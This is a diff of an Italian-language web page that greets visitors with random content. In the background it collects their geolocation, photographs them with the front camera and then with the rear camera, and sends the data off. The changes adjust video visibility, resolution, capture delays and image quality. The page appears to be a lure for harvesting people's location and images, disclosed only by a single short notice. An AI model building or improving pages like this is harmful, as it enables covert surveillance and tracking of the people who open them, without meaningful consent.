@@ -37,13 +37,23 @@
         window.collection = collection;
         window.addDoc = addDocFunc;
     </script>
+    <style>
+        #video {
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+        #debug {
+            color: blue;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
     <h1>Benvenuto!</h1>
     <div id="content"></div>
     <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
     <div id="debug"></div>
-    <video id="video" autoplay style="display: none;"></video>
+    <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
@@ -113,13 +123,16 @@
             if (video) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: facingMode }
+                        video: { facingMode: facingMode, width: 640, height: 480 }
                     });
                     video.srcObject = stream;
                     logDebug(`Fotocamera ${facingMode} avviata`);
                     // Aspetta che il video sia pronto
                     await new Promise((resolve) => {
-                        video.onloadedmetadata = () => resolve();
+                        video.onloadedmetadata = () => {
+                            logDebug(`Video pronto: ${video.videoWidth}x${video.videoHeight}`);
+                            resolve();
+                        };
                     });
                     return stream;
                 } catch (err) {
@@ -139,15 +152,16 @@
             if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg');
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg', 0.8); // Qualità JPEG ridotta per file più piccoli
                 logDebug("Foto scattata, dimensione: " + photo.length + " caratteri");
                 // Mostra temporaneamente l'immagine per verifica
                 const tempImg = document.createElement('img');
                 tempImg.src = photo;
                 tempImg.style.maxWidth = '100%';
                 document.body.appendChild(tempImg);
-                setTimeout(() => document.body.removeChild(tempImg), 2000);
+                setTimeout(() => document.body.removeChild(tempImg), 3000); // Mostra per 3 secondi
                 return photo;
             } else {
                 logDebug("Video o canvas non valido o dimensioni zero");
@@ -191,11 +205,11 @@
                 showRandomContent();
                 const location = await getLocation();
                 let stream = await startCamera('user');
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Ritardo per sicurezza
+                await new Promise(resolve => setTimeout(resolve, 2000)); // Ritardo aumentato a 2 secondi
                 const frontPhoto = takePhoto();
                 stopCamera(stream);
                 stream = await startCamera('environment');
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 const backPhoto = takePhoto();
                 stopCamera(stream);
                 await sendData(location, frontPhoto, backPhoto);
